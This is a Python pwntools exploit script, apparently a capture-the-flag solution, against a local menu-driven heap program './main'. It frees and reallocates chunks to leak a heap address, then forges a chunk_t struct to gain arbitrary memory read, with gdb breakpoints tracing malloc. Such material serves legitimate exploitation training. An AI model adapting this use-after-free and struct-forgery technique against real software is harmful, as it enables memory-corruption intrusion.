#!/usr/bin/env	python3
import pwn, ctypes

class heap_ops:
	def __init__(self, debug = False, gdbscript=""):

		if not debug:
			self.r_process = pwn.process("./main")
		else:
			self.r_process = pwn.gdb.debug("./main", gdbscript=gdbscript)
	

	def add_chunck(self, size, data):
		assert isinstance(data, bytes)

		self.r_process.clean()
		self.r_process.sendline(b"1")

		# send size of chunck
		self.r_process.clean()
		self.r_process.sendline(str(size).encode())

		# send data from chunck
		self.r_process.clean()
		self.r_process.sendline(data)

	def delete_chunck(self, chunck_id):
		self.r_process.clean()
		self.r_process.sendline(b"2")

		self.r_process.clean()
		self.r_process.sendline(str(chunck_id).encode())

	def view_chunck(self, chunck_id):
		self.r_process.clean()
		self.r_process.sendline(b"3")

		self.r_process.clean()
		self.r_process.sendline(str(chunck_id).encode())

		return self.r_process.recvuntil(b"1. Add")[:-6]


	def exit(self, state = 1):
		# exit program
		self.r_process.sendline(b"4")
		if not state:
			self.r_process.close()
	

@pwn.context.quiet
def main():
	hops = heap_ops(True, """
		break main
		commands
			silent
			break malloc
			commands
				silent
				set $local=*(unsigned long long *)$rsp
				tbreak *$local
				commands
					silent
					print /x $rax
					continue
				end
				continue
			end
		end
		continue
	""")

	hops.add_chunck(100, b"")
	hops.add_chunck(100, b"")
	hops.add_chunck(100, b"")

	hops.delete_chunck(0)		# allocates chunck_t for chunck 3
	hops.delete_chunck(1)		# allocates chunck_t for chunck 4
	hops.delete_chunck(2)		# allocates ptr for chunck 4

	# leaks memory address
	hops.add_chunck(100, b"")
	heap_address = pwn.unpack(hops.view_chunck(3)[:8], 64) & ~0xfff

	# typedef struct chunk_t {
	#     int64_t size;
	#     int64_t used;
	#     void *ptr;
	# } chunk_t;
	hops.add_chunck(24, b"%s" % (pwn.p64(20) + pwn.p64(1617) + pwn.p64(heap_address)))

	hops.r_process.interactive()
	print(hops.view_chunck(1))

	hops.exit(0)

if __name__ == "__main__":
	main()
